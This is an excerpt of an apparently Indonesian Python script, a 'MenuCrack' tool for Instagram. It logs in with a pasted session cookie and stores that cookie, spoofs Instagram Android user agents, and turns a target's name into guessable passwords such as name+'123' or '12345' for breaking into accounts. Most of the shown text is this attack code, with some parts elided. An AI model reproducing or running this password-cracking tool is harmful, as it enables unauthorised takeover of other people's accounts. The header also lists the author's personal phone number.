...
# Coded by : FinoDafaresta
# Python version : 2.00.9
# Whattsap   : 0838324863130
...
def LoginCookie():
    print(Banner())
    print(f'\n{N}[{H}!{N}] Harap Menggunakan akun New untuk Login')
    cookie = input(f'[{H}?{N}] Cookie Instagram  : {N}')
    try:
        HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
        ...
        with open('data/cookie.txt', mode='w', encoding='utf-8') as wr:
           wr.write(f'{cookie}')
        wr.close()
        print('\n%s[%s!%s] Sukses login dengan nama %s'%(N,H,N,info))
        quit()
...
def MenuCrack():
    ...
    try:
        ...
        print('%s[%s!%s] Welcome to Scrip FinoDafaresta ini sc igeh ngab'%(N,M,N));time.sleep(3);LoginCookie()
    try:
        HEADERS.update({'cookie': cookie,'x-csrftoken': re.search('csrftoken=(.*?);',cookie).group(1),'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'})
        curl = httpx.get(userinfo.format(**{'id': re.findall('ds_user_id=(\d+)', str(cookie))[0]}), headers=HEADERS)
        info = json.loads(curl.text)['user']['full_name']
...
[%s0%s] Keluar\n'''%(N,H,N,H,N,H,N,H,N,H,N,H,N,H,N,M,N))
    ...
    if main in   ['1','01']:
       ...
       text = 'Bang+Gw+Mau+Upgrade+Script+FinoGanteng+Ke+Premium!'
...
def generate(name):
    ...
    for y in name.split(' '):
        if len(y) <3:pass
           ...
           xxx.append(f'{y.capitalize()}1231')
           xxx.append(f'{y.capitalize()}123123')
        else:
           xxx.append(y+'123')
           xxx.append(y+'1234')
           xxx.append(y+'12345')
...
def UserAgent():
    ...
    ua1 = f'Instagram {versi} Android ({andro}; {dpis}; {pxl}; vivo; vivo 1904; 1901; mt6762; {basa}; {kode})'
